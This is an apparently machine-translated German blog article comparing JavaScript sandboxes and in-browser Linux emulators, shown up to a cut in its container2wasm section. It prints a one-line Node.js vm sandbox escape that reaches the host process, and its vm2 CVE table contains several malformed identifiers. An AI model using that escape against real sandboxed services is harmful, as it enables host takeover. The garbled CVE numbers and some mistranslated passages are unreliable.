---
title: Vergleich der JavaScript-Lösungen für Linux-Kernel-Simulationen
description: Eine tiefgehende Analyse der Nachbildungen von Linux-Umgebungen in JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
lang: "de"
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "01lbbgz8sAKLL0Em3GZT0+bYQhybXSxMx3aifXIvjR0TcTTt23VcoLeGXyvhz/FwM6FAfgRbgSNdgodRJ+1ZGg=="
---
# 

Also, ich bin schon eine Weile zu weit in diesem Kaninchengarten. [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)– ein Fortune-Projekt (ich komme gleich wieder) – und man fragte mich ständig: "Warte, was ist der Unterschied zu`v86`?" oder "Warum nicht verwenden`vm2`?" – und ich erkannte, dass ich keine klare Antwort geben konnte, ohne zuerst das gesamte Ökosystem zu kartieren.

Es stellt sich heraus, dass es vier verschiedene Familien gibt - JS Sandkästen, Linux Emulatoren, Linus Simulatoren und Honeypots - und sie überschneiden sich fast nie, auch wenn sie ständig im selben Satz erwähnt werden.`isolated-vm`. Jemand, der eine CLI-Tool Demo macht verwendet`v86`. Jemand, der SSH-Bedrohungen informiert, verwendet Cowrie. Sie lösen völlig unterschiedliche Probleme unter dem gleichen Regenschirm "Code in einer Box drehen."

Ich habe viel Zeit damit verbracht, Quellcode, CVE-Berichte, Architektur-Dokumente und npm-Seiten zu lesen, um diesen Artikel zu schreiben.

> Kleiner Disclaimer:`typescript-virtual-container`wird in diesem Artikel hervorgehoben, weil es das ist, was diese Suche ausgelöst hat. Ich habe versucht, fair zu sein alles andere, aber halte diesen Kontext im Kopf.

---

## Teil 0 – Zuerst, welches Problem löst du wirklich?

Bevor wir eintauchen, ist es den Versuch wert, genau zu sein, was die einzelnen Familien brauchen, denn die Terminologie wird schnell zu einem planhaften Begriff und die Menschen vermischen alles ständig (ich auch, bevor ich mich setze und ganz sauber kartiert).

**JS** Sandkästen isolieren JavaScript-Code vom Host Node.js-Prozess. Das Bedrohungsmodell ist: Unzuverlässiger JS-Code, der als "Node.jS" bezeichnet werden könnte.`process.exit()`, Dateien lesen oder Kinderprozesse starten. Die Lösung ist eine Grenze um die Ausführung V8. Diese Tools haben keine Vorstellung von einem Linux-Shell, einem Dateisystem mit Berechtigungen oder SSH.

**Die Linux-Emulatoren** drehen einen echten Linuxkern in einem CPU-Emulationsgerät (x86, RISC-V, OR1K) in JavaScript oder WebAssembly. Du startest ein echtes Betriebssystem. Du hast echte Systemanrufe. Du kannst Binärkompatibilität mit den Programmen haben, die für x86 kompiliert wurden. Die Ressourcenkosten sind enorm.

**Linux-Simulatoren** imitieren das Verhalten* eines Linux-Systems ohne einen echten Kernel zu drehen. Sie implementieren einen Shell-Interpreter, ein virtuelles Dateisystem und genug Unix-Sensation, um Programme und Menschen zu täuschen. Ohne Wasm, ohne CPU-Emulsion. Viel weniger Ressourcen.

**Honeypots** sind so konzipiert, dass sie Angreifer anlocken und aufzeichnen, was sie tun. Dies sind nicht hauptsächlich Ausführungsumgebungen – sie sind Beobachtungswerkzeuge. Die Treue zum tatsächlichen Verhalten von Linux ist nur wichtig, da sie verhindert, dass Angreifern die Falle erkennen.

Mit diesem Rahmen, hier ist, wo jedes Projekt in diesem Artikel ist:
```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Émulateur Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulateur Linux : typescript-virtual-container (unique dans cet espace)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (pas un isolateur, mais connexe)
```
---

## Teil 1 – JavaScript Sandkästen

### 1.1`vm`– das native Node.js-Modul (nicht, was du glaubst)

Die älteste Antwort auf "unzuverlässige JS ausführen" in Node ist das native Modul`vm`Es gibt es seit dem v0.1, also benutzen viele Leute es zuerst – und werden verbrannt.
```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```
Was`vm`tatsächlich: Es schafft einen neuen V8-Kontext (eine neue Gruppe von einheimischen Bauherren –`Object` , `Array` , `Function`, etc.) und führt Code innen, mit einer gemeinsamen Referenz auf, was du in`sandbox`Dein V8-Motor ändert sich nicht, dein Prozess ändert sich noch.

Der Grund für die`vm`bietet keine Sicherheit: JavaScript Prototypenkette ist ein DAG, das alles mit`Object.prototype`Wenn du ein Objekt aus der Welt des Wirts in den Sandkasten steckst, kann der Gast seine Prototypenkette wieder aufsteigen und die Wirtsbauer erreichen.`Function`- Du kannst anrufen.`Function("return process")()`und den echten zurückholen`process`- Spiel over.
```js
// Es funktioniert perfekt in vm – du holst den echten Prozess zurück
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```
Ich meine, die Dokumentation von Node.js selbst sagt: "Vm-Modul ist kein Sicherheitsmechanismus. Verwendest du es nicht, um unzuverlässigen Code auszuführen." Diese Warnung ist schon immer da. Die Leute ignorieren es ständig. Ich habe Anwendungen in der Produktion zu verwenden`vm`Bitte tu das nicht.

**Verdict**: ein Notensystem, kein Sandkasten. Verwende es, wenn du Variablen (Schlagmaschinen, Typ-Funktionen) isolieren musst.`eval`Ich habe nie für unzuverlässige Einträge gedacht.

**Speicher**: vernachlässigbare Überlastung – sogar viele V8-Prozesse wie der Host-Prozess. **Sicherheit**: keine gegen einen motivierten Angreifer.

---

### 1.2`vm2`– der Versuch der Gemeinschaft und sein sehr langer Tod

`vm2`war die Antwort der Gemeinschaft auf das Problem der Flucht aus`vm`. Die zentrale Idee: Einwickeln jedes Objekts, das die Grenze der Sandbox in einem`Proxy`Dass der Zugriff auf die Eigenschaften abfängt, die Prototypen nach oben sperrt und gefährliche Referenzen filtert. In der Theorie ist es klug! In der Praxis hat sich das Ergebnis als weniger überzeugend erwiesen, wie wir sehen werden.
```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // startet VMEror, unzugängliche Prozesse
```
Es hat mehrere Jahre lang ziemlich gut funktioniert, aber die Angriffsfläche der`Proxy`JavaScript ist riesig. Jede neue Funktion der JS-Sprache – Generatoren, Asynchron-Iteratoren,`Symbol.toPrimitive` , `Error.prepareStackTrace`, die internen`Promise`– ist ein potenzieller Umgehungsvektor.

Die Chronologie der CVE ist... etwas.

| Datum | CVE | Mechanismus |
|------|-----|-----------|
| Oct 2022 | CVE-2022-36067 | Ausweichen des Host-Kontexts über`Error.prepareStackTrace` |
| April 2023 | CVE-2023-29017 | Host-Objekt-Leck über ungesteuerte async-Fehler |
| April 2023 | CVE-20023-29199 | Umgekehrte Sanierung von Ausnahmen durch`handleException()` |
| April 2023 | CVE-202-33-30547 | `Proxy.getPrototypeOf` → `Function`→ RCE |
| Mai 2023 | CVE-202-332314 | `Proxy`über`Error.name` → `Function`→ RCE |
| Jul 2023 | CVE-2023-37466 | Funktion async + Stapelüberlauf +`Proxy.getPrototypeOf` |
| Jul 2023 | CVE-2023-37903 | Worker thread + Flucht durch Eval |

Drei CVE Kritiker im selben Monat (April 2023). DREI. IN EINEM MONAT. Nach CVE-2023-37903 hat der Betreuer die Bibliothek offiziell mit der Nachricht abgewertet: *"Die Bibliothek enthält kritische Sicherheitsprobleme und sollte nicht in der Produktion verwendet werden."*

Der Betreuer hat sie im Oktober 2025 mit der Version 3.10.0 auferweckt, weil er behauptet hat, alles, was damals bekannt war, korrigiert zu haben. Eine neue kritische Flucht (CVE-2026-22709, CVS 9.8) wurde im Januar 2026 offenbart, gefolgt von einer Reihe von elf weiteren im Mai 2026. Elf. Das Schema hat sich nicht geändert und ich glaube ehrlich nicht, dass es eines Tages geändert werden wird.

Das grundlegende Problem ist architektonisch – und das ist die Lektion, die das ganze Ökosystem brauchte, um zu lernen. Du kannst nicht mit derselben Sprache, die du isolierst, auf demselben Motor, im selben Prozess eine sichere Sandbox bauen. Die Fluchtfläche ist die vollständige Implementierung von V8 –, und V8 macht mehrere Millionen Zeilen von C++, die sich ständig ändern. Jede neue JS-Funktion öffnet möglicherweise einen neuen Angriffsweg.

**Verdict**: Nicht für sicherheitsempfindliche Anwendungen verwenden. Auch auf der neuesten Version werden alle paar Monate neue Umleitungen entdeckt.

---

### 1.3`isolated-vm`– der wirklich funktioniert

`isolated-vm`nimmt den richtigen Ansatz an: die native Isolierung V8 Primitive verwenden, Isolat. Jedes V8 Isolat hat seinen eigenen Haufen, seine eigenen Krümel, seine eigene Gruppe von Einheimischen, und Null Referenz mit anderen Isolaten geteilt.

Es ist die gleiche Grenze, die Chrome verwendet zwischen Registerkarten. Es ist eine echte Sicherheitsbarriere, nicht ein Trick der Sprache auf Proxy gebaut.
```js
import ivm from "isolated-vm";

// Jedes Isolat ist sein eigener V8 Haufen
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB-Grenzwert
const context = await isolate.createContext();
const jail = context.global;

// Daten über die Grenze zu transferieren erfordert eine explizite Serialisierung
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Kann Host-Prozess, Host-Haufen oder Host-Module nicht erreichen
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Du kannst plötzlich auf Zeitout oder Speichergrenze beenden.
isolate.dispose(); // Befreit den ganzen Haufen
```
Typen`Reference`und`ExternalCopy`sind die explizite Kommunikationsbrücke.`Reference`Gibt dem Isolat eine Hand, die auf eine Host-Funktion anrufbar ist – kann das Isolat es anrufen, kann aber nicht inspizieren, ob es geschlossen oder prototypisiert wird.`ExternalCopy`Verkörpert einen Wert (strukturierter Klon) über die Grenze des Haufens. Dieses explizite Brückenmodell ist nicht praktisch, aber das macht die Isolierung real.

du kannst strenge Ressourcengrenzen festlegen: Speicher (Isolat ist beendet, wenn es die Grenze überschreitet), Zeitout Wanduhr und Zeitout CPU. Die Endung ist real – sie tötet das ganze Isolat V8, nicht nur ein Timeout JS, das mit einem umgehbar werden kann`while(true)` .

**Limites**: Es ist nur JS. Du kannst nicht bash innen ausführen. Es gibt keine Datei-, Berechtigungs-, Netzwerk- oder Prozesskonzepte. Es ist genau das richtige Werkzeug für das vom Benutzer eingereichte JS (Plugins, Formeln, Skripthooks) und das falsche Werkzeug für alles andere.`typescript-virtual-container`erwähnte, dass sie es zunächst in Betracht gezogen hatte, bevor sie erkannte, dass "Shell-Befehle ausführen" und "JavaScript isolieren" grundsätzlich unterschiedliche Probleme sind.

**Speicher**: ~3-10 MB durch leeres Isolat, erhöht sich mit der Verwendung des Tas. **Sicherheit** . Die Grenze V8 Isolat ist die eigentliche Isolierungsprimär. **npm** ,[isolated-vm](https://www.npmjs.com/package/isolated-vm) **GitHub**:[laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4`quickjs-emscripten`– ein separater JS-Motor, der als Wasm kompiliert wird

Ein anderer Ansatz: Statt in V8 zu isolieren, drehen du einen komplett separaten JavaScript-Motor in WebAssembly kompiliert. Der Host dreht sich in V8/Node. Der Gast dreht sich um QuickJS-in-Wasm. Die Wasm Sandbox liefert die Isolationsgrenze.

QuickJS ist noch ein Werk von Fabrice Bellard (derselbe Kerl hinter QEMU, FFmpeg, JSLinux, TinyEMU - diese Person ist nicht real, ernsthaft, wie kann nur eine Person das alles tun?). Es ist ein kleiner JS-Motor, der nach ES2023 in C geschrieben ist und in Wasm kompiliert wird, es macht nur etwa 500 KB.
```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Wird in QuickJS ausgeführt, komplett getrennt von V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```
QuickJS ist ein kleiner JavaScript-Engin gemäß ES2023, geschrieben in C. Kompiliert in Wasm, es macht etwa 500 KB für die Synchronvariante, ~1 MB für die Asynchronvariante (Asyncify). Speicherverwaltung ist manuell – jeder Wert, den du aus der VM extrahieren, muss explizit freigegeben werden, was ein wenig langweilig ist, aber die Überraschungen von GC inter-Grenzen verhindert. Ein lustiger Kompromiss!

Der Wrapper`@sebastianwessel/quickjs`fügt eine ergonomischere API über, mit einem optionalen virtuellen Dateisystem, Fetch-Unterstützung und Node.js-Modul-Stubs:
```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```
Das Sicherheitsmodell unterscheidet sich von`isolated-vm`: Das lineare Speichermodell von Wasm macht den Gast nicht direkt auf die Objekte des V8-Haufens zugreifen. Die Angriffsfläche ist die Host-Schnittstelle↔Wasm (Importe/Exporte), nicht die ganze JS-Sprache. Es wird allgemein als robuster als Proxy-basierte Sandkästen angesehen.

Die Rückseite: QuickJS hat nicht das gleiche Maß an Optimierung wie V8. Bei CPU-bound-Laden in JS ist das 5 bis 20-mal langsamer als V8. Für kleine Codespitzen und unzuverlässige Bewertungen ist das normalerweise nicht wichtig.

**Speicher** ~500 KB-Modul Wasm + Tas pro Instanz. **Sicherheit**: Wasm-Grenze, die als solider als Proxy-basierte Ansätze angesehen wird. **Npm**:[quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) , [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) **GitHub**:[justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno – ein Runtime, der die Erlaubnissen zuerst stellt

Deno nimmt eine völlig andere Philosophie an: anstatt Sandkasten in Node zu machen, baute er einen neuen Runtime, der standardmäßig gesichert ist. Ich mag diesen Ansatz wirklich – das hätte Node.js von Anfang an sein sollen, ehrlich. Ryan Dahl (der ursprüngliche Schöpfer von Node, der Node!js) hat Deno buchstäblich geschaffen, weil er einige Node-js-Designentscheidungen bedauerte, was ziemlich verrückt ist, wenn man darüber nachdenkt.

Jede empfindliche Kapazität (Datei, Datei, Netzwerk, Umgebung, Subprozess) erfordert einen Flag`–allow-*`explizit:
```bash
# Dieser kann nur in /data lesen, nichts anderes
deno run --allow-read=/data script.ts

# Dieses kann nur auf eine einzige Domain zugreifen.
deno run --allow-net=api.example.com script.ts

# Keine flags = keine Erlaubnis
deno run untrusted.ts # peut pas lire, écrire, réseau, lancer
```
Das Lizenzmodell wird auf Rust/OS-Ebene implementiert - es ist kein JS-Tipp. Wenn der Deno-Code aufruft`Deno.readFile()`Es geht über eine Operation Rust, die die Berechtigungstabelle überprüft, bevor du das Dateisystem berühren. Du kannst es nicht von JS aus umgehen, weil der Systemaufruf nie stattfindet, wenn die Erlaubnis nicht erteilt wird.

Um wirklich unzuverlässigen Code auszuführen, bieten die Workers Deno (Web Workers) ein zweites Isolat im selben Prozess, jedes mit eigenem Recht. Du kannst einen Worker mit Null-Meinung starten und mit ihm über`postMessage` .

Deno 2 (im Oktober 2024) hat die Kompatibilität npm und Node.js Kompatibilitätsshims hinzugefügt, was seine Akzeptanz für Server-basierte Anwendungsfälle erheblich verbessert hat.

**Der Kompromiss**: Denos Sicherheitsmodell ist ausgezeichnet für Code, auf den du teilweise vertrauen könntest. Für völlig unzuverlässigen Code, der adversarial sein könnte, hilft das Lizenzmodell nicht – du brauchst eine Isolatgrenze (`isolated-vm`) oder einem anderen Motor (`quickjs-emscripten`), weil Deno immer noch V8 verwendet und anspruchsvolle Angreifer Fehler auf V8-Level finden können.

---

### 1.6 TC39 ShadowRealm – die standardisierte Antwort (ein Tag)

Die JavaScript-Normungsstelle (TC39) hat einen Vorschlag namens ShadowRealm, der versucht, zu standardisieren, was`vm`und`vm2`versuchten, aber mit einem korrekten Sicherheitsmodell zu tun. Ein ShadowRealm schafft einen isolierten JS-Ausführungskontext mit seinen eigenen Intrinsien, keinen Zugriff auf das äußere Reich und eine sorgfältig kontrollierte Import/Export-Schnittstelle.
```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Separate Intrinseken, kein Zugang zum äußeren Reich
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```
ShadowRealm ist in Browsern (Chrome 90+, Firefox 105+) erhältlich, ist aber noch nicht in Node.js stabil im Jahr 2026. Der Vorschlag TC39 Compartments stützt sich darauf für die Isolierung auf Modulebene. Dies sind die langfristigen standardisierten Antworten, aber sie sind noch nicht bereit für die Node-Server-Seite Produktion. Dies ist einer dieser Baustellen, die du von weit her ansiehst, aber... es ist noch nicht da.

---

### Zusammenfassung der Sandboxenfamilie

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Isolierfront** | Keine (Tür) | Proxy (verstopft) | V8 Isolat | Wasm | V8 Isolat + Perms Rust |
| **Speicher-Limite** | ❌ | ❌ | ^Engstgrenze | ✓ tas Wasm | teilweise |
| **Timeout CPU** | ❌ | ✓ (konturierbar) | n n | ✅ | ✅ |
| **Sicherheit** | Keine | gebrochen | fest | fest | fest |
| **Besuche JS** | V8 native | V8 native | V8 native | ~10x langsamer | V8 native |
| **Navigator** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Kompatibilität Node** | native | ✅ | ✅ | Teilschims | teilweise |
| **Status** | stabil | Risiko (neue CVE) | ■ Aktiv | ■ Aktiv | ■ Aktiv |
| **Ram-Überladung** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

Das Urteil: Wenn es dir wichtig ist, dass du sicher bist, gibt es genau zwei echte Optionen –`isolated-vm`(Native Erweiterung, V8 Isolat, Vollgeschwindigkeit JS) und`quickjs-emscripten`(Wasm, Browser-Kompatibilität, ~10x langsamer für intensive Berechnung). Alles andere ist entweder "Bitte tu das nicht" (`vm` , `vm2`) oder ein Runtime, das ein völlig anderes Problem (Deno) löst. ShadowRealm könnte die gegebene eines Tages ändern, aber das ist noch nicht der Fall.

---

## Teil 2 – Linux-Emulatoren in JavaScript

Hier werden die Dinge wirklich interessant für mich. Das sind echte *Emulatoren – sie implementieren ein CPU-Anweisungsspiel in JavaScript oder WebAssembly, starten ein echtes Linux-Kernel-Image und führen echte Benutzer-Binärs aus. Die Isolierung ergibt sich aus der Tatsache, dass Gast und Host nichts teilen: unterschiedliche Speicherräume, unterschiedliche Anweisungen.

Der Preis ist enorm, aber was du bekommst, ist wirklich bemerkenswert: echtes Linux, das wirklich dreht, in deinem Browser oder Node-Prozess.

### 2.1`v86`– PC-Emulator x86 in JS + JIT Wasm

`v86`von Fabrice (Copy auf GitHub) ist der fähigeste X86 Open-Source-Emulator in JavaScript. Es begann als reiner JS-Interpreter gegen 2013 und entwickelte sich zu einem JIT-System, wo die x86-Basisblöcke in WebAssembly übersetzt werden, die Leistung deutlich verbessert.

Was er emuliert:

- **CPU**: x86-32 (IA-32), Anweisungen auf der Pentium-Ebene 1. 64-bit (x86-64) bleibt ausgeschlossen – es ist eine architektonische Grenze, keine fehlende Funktionalität.

- **FPU**:`Float64Array`JavaScript. Das x87 ist 80-bit-Präzision; die doppelten JS-Werte sind 64-bit. Das bedeutet, dass die Ergebnisse im Gleitkomma leicht von einer echten CPU abweichen können.

- **Speicher**: konfigurierbar, mappe zu einem`SharedArrayBuffer`oder`ArrayBuffer`- Ja, in den JS-Haufen.

- **Material**: 8254 PIT (Timer), 8259 PIC (Unterbrechungsregler), Tastatursteuerung 8042 (PS/2), CMOS RTC, VGA mit SVGA-Erweiterungen und Bochs VBE, IDE-Controller, Diskettencontroller (8272A), NE2000-Netzwerkkarte.

- **BIOS**: verwendet SeaBIOS (BIOS x86 open-source).

Das JIT arbeitet, indem es Basisblöcke (Ausgabenfolge x86 ohne Sprung) identifiziert, sie in eine WebAssembly-Funktion übersetzt, diese Funktion in Zwischenspeichern setzt und sie bei den folgenden Ausführungen desselben Blocks aufruft. Warme Codepfade erhalten native Wasm-Leistungen. Kalte Pfade fallen auf den JS-Interpreter zurück.
```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 Mo
  autostart: true,
});

// Serial-Ausgabe erfassen (Linux Kernel console)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Einen Eintrag zum Gast senden (in der Shell taper)
emulator.serial0_send("ls /\n");
```
**OS unterstützt**: Alpine Linux (ausgezeichnet), Ubuntu 16.04/18.04 (nur i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (mit Vorbehalten), MS-DOS.

**Startzeiten**: 15-40 Sekunden für Alpine Linux von einem sauberen Bild aus. Es ist in der tatsächlichen Kernel-Initiierung enthalten – du kannst es nicht überspringen. Ja, deine Benutzer werden einen Linux-Kernel in ihrem Browser starten sehen.

**Minimumspeicher**: 100-256 MB pro Instanz. Der einzige Wasm JIT Code-Cache kann Dutzende von MB für eine belegte Linux-Instanz erreichen.

**Benutzen du in Node.js**: vollständig unterstützt. Die DOM bleibt überflüssig – die VGA-Ausgabe kann ignoriert werden, wenn du sich nur für die serielle Ausgabe interessieren.

**Was du nicht tun kannst**: 64-Bit-Binärs ausführen, moderne Kernelfunktionen (eBPF, io_uring usw.) verwenden oder mehr als eine Handvoll Instanzen gleichzeitig drehen, ohne die Speichergrenzen zu erreichen.

**npm**:[v86](https://www.npmjs.com/package/v86)– ständig aktualisiert, letzte Veröffentlichung am selben Tag, wenn ich schreibe. **GitHub**:[copy/v86](https://github.com/copy/v86) **Demo**:[copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux und Tinyemu – die Arbeit von Bellard, in zwei Schritten

JSLinux ist der eigene Linux-Emulator in Fabrice Bellard – der erste, der 2011 veröffentlicht wurde. Ich erwähne Bellardin weiterhin in diesem Artikel, weil er nicht aufhört, wieder zu erscheinen: QuickJS, TinyEMU, JSLINux, QEMU, FFmpeg. Dieser Kerl ist etwas anderes. Wirklich einer der beeindruckendsten individuellen technischen Beiträge in der Geschichte der Software, ohne Übertreibung.

Das Original JSLinux war ein reiner JS-Interpreter x86. 2016 schrieb Bellard Tinyemu (ein RISC-V-Emulator in C), kompilierte es in JavaScript über Emscripten und wurde zur Basis des aktuellen JSLInux. Der aktuelle JSLINux ist also Code C, der Javascrip erzeugt – überhaupt nicht von Hand geschrieben.

Die technischen Anmerkungen auf der Bellard-Website sind es wert, gelesen zu werden: Der aktuelle JSLinux dreht eine RISC-V 32 oder 64-bit CPU (nicht x86), emulgiert eine VirtIO-Konsole, ein Virtio-Netzwerk, ein virtuelles Block-Gerät und ein 9P-Dateisystem für die Dateifreigabe mit dem Host. Die JS-Demo wird von C mit Emscripten kompiliert – das ist kein handgeschriebenes JS.

Tinyemu selbst unterstützt:

- RISC-V RV32IMAFDQC und RV64IMAF DQC (32 und 64-bit, mit Gleitkomma, Multiplikation, komprimierte Anweisungen)

- x86 über KVM (nur nicht emulationiert – also ist JS nur RISC-V)

- VirtIO Konsole, Netzwerk, Block, Eingabe, 9P-Dateisystem

TinyEMU hat eine JavaScript Demo über Emscripten. Es ist die Basis von JSLinux und wird auch von`container2wasm`(siehe Abschnitt 2.5).

**Statut JSLinux**: kein npm-Paket, keine programmierbare API. Es ist eine Demo, die du in deinem Browser öffnest. Historisch wichtig – es hat das Konzept bewiesen. Praktischer Nutzen als Bibliothek: null.

**TinyEMU**: nicht auf npm, Quelle C verfügbar auf [bellard.org/tinyemu](https://bellard.org/tinyemu/) .

---

### 2.3 jor1k – OR1K Emulator

jor1k ist ein OpenRISC 1000 (OR1K) Emulator, der von Sebastian Macke in JavaScript geschrieben wurde. Das ist historisch interessant, weil jore1k die Unterstützung des 9P VirtIO-Dateisystems eingeführt hat, das Bellard dann in Tinyemu und JSLinux integriert hat. Die Kreuzbestäubung zwischen diesen Projekten ist eng - sie borgen sich alle Ideen gegenseitig, was ehrlicherweise eines der coolsten Dinge der Open-Source-Emulsion ist.

**Statut**: Aktiver gehalten, kein Paket npm. Archiviert an diesem Punkt. Nützlich, um vor allem für den historischen Kontext zu wissen – Genre, wenn jemand jor1k in einem Gespräch erwähnt, jetzt weißt du, was es ist:)

---

### 2.4 CheerpX – kommerzielles x86-Emulator für den Browser

CheerpX von Leaning Technologies ist der kommerzielle Linux x86-Emulator der Produktionsqualität. Es ist nicht Open-Source, aber es ist wesentlich besser als v86, um einen echten Debian/Ubuntu-Userspace laufen zu lassen. Wenn du einen echten VSCode im Browser benötigen, ist es das, was du brauchst.

Schlüsseldifferenzen zu v86:

- Unterstützt eine breitere ISA (mehr x86 Erweiterungen, bessere Kompatibilität glibc)

- IndexedDB-basiertes Dateisystem im Browser (Behälter zwischen Seitenaufladungen)

- Unterstützung pthread via`SharedArrayBuffer`(die COOP/COEP-Header benötigt – ja diese lästigen Sicherheits-Header)

- Entwickelt, um VSCode, Python, Node.js und andere reale Anwendungen zu drehen – nicht nur minimale Betriebssystem-Bilder

- Professionelle Unterstützung und SLA verfügbar (aka kann man jemanden anschreien, wenn es bricht)

Der typische Anwendungsfall ist "eine echte Linux-Anwendung im Browser ohne Server laufen zu lassen." Unternehmen verwenden sie für Browse-basierte IDEs, Kodierungs-Tutorials und interaktive Dokumentation.
```js
// CheerpX API (vereinfacht)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```
**Geschichte mit Node.js**: CheerpX ist zunächst für den Browser entwickelt. Der zugrunde liegende Emulator könnte theoretisch in Node (das ist Wasm) laufen, aber die API und die Dokumentation sind vollständig auf die Verwendung des Browseers ausgerichtet. Die Nutzung auf Serverseite wird nicht unterstützt.

**Speicher**: ähnlich wie v86 – 200+ MB für eine echte Debian-Instanz. **Tarification**: kostenlos für Open-Source-Projekte, kommerzielle Lizenz für SaaS in Produktion. **Docs**:[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 Webcontainers (StackBlitz) – Node.js en Wasm, keine Linux-Emulation

Webcontainer werden oft in dieselbe Tasche wie Linux-Emulatoren gelegt, aber sind architektonisch verschieden. Sie emulieren nicht x86. Sie starten nicht Linux. Sie drehen Node.js als WebAssembly mit WASI kompiliert. Diese Unterscheidung zählt viel und ich verbrachte viel zu viel Zeit damit, darüber verwirrt zu sein.

Ich denke, die Verwirrung kommt aus dem Marketing – "Node.js in deinem Browser drehen" sieht aus wie Emulation, aber es ist eigentlich Node.jms selbst in Wasm kompiliert, nicht eine Linux-Emulation, die Node,js auf eine VM dreht. Zwei völlig unterschiedliche Architekturen.

Architektur:

1. Node.js wird in Wasm (ein speziell angepasstes WASI-Runtime) kompiliert

2. Ein Service Worker fängt Netzwerkanfragen vom emulierten Node.js Server ab und führt sie in die Registerkarte des Browsers

3. Das Dateisystem lebt im Browserspeicher (keine Festplatte/E)

4. npm ist eine benutzerdefinierte Implementierung, die für den Einsatz im Browser optimiert ist
```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Dateien schreiben
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Befehle ausführenNode.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```
Da es echte Node.js (kompiliert als Wasm), hast du eine echte npm, echte Nod.jS-APIs und eine echte Module-Auflösung. du hast keinen allgemeinen Linux-Userspace – du kannst keine Systempakete mit`apt`, Willkür kompilierte Binärs ausführen oder viel außerhalb des Node.js Ökosystems tun.

**Browser-Anforderungen**: SharedArrayBuffer (Benötigt COOP/COEP-Header), Support Service Worker, Wasm modern.

**Geschichte mit Node.js**: ausschließlich für den Browser-Benutzer entwickelt. Die API funktioniert nicht außerhalb eines Browse-Kontexts.

**npm**:[@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) **Docs**:[webcontainers.io](https://webcontainers.io)

---

### 2.6 Container2wasm – Docker-Container in Wasm kompiliert

`container2wasm`ist ein NTT-Tool (nicht ein Npm-Paket), das ein Docker-Containerbild nimmt und es in einen WebAssembly-Binär umwandelt, der in jedem Wasm-Host laufen kann – einschließlich eines Browsers. Als ich das zum ersten Mal sah, dachte ich wirklich nicht, dass es funktioniert.

Der Mechanismus

- Für x86_64 Container: Versenden Bochs (ein x86 Emulator, kompiliert als Wasm) + das Wurzeldateisystem des Containers

- Für die Container riscv64: versenden TinyEMU (noch Bellard!) + das Wurzeldateisystem des Containers

- Die Datei`.wasm`Ergebnis startet den Emulator, montiert das Dateisystem des Containers, und führt den Eingangspunkt des Container
```bash
# Umwandeln eines Ubuntu-Containers22.04 in Wasm
c2w ubuntu:22.04 out.wasm

# Ausführen
wasmtime out.wasm uname -a
# Linux5.15 . 0 # 1 SMP riscv64 GNU/Linux

# Oder es für die Verwendung von Browser
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```
